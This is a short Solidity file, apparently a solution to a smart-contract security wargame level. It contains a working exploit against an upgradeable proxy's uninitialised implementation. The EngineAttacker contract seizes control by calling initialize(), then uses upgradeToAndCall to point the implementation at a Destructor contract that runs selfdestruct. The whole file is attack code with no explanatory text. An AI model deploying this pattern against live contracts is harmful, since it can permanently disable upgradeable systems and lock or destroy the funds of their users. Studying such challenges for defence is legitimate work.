// SPDX-License-Identifier: MIT

pragma solidity >=0.6.0 <0.9.0;

interface IEngine {
    function initialize() external;

    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract EngineAttacker {
    IEngine public engine;

    constructor(address _engine) public {
        engine = IEngine(_engine);
    }

    function attack() public {
        engine.initialize();

        Destructor destructor = new Destructor();
        bytes memory encodedData = abi.encodeWithSignature("destruct()");

        engine.upgradeToAndCall(address(destructor), encodedData);
    }
}

contract Destructor {
    function destruct() external {
        selfdestruct(payable(address(0)));
    }
}
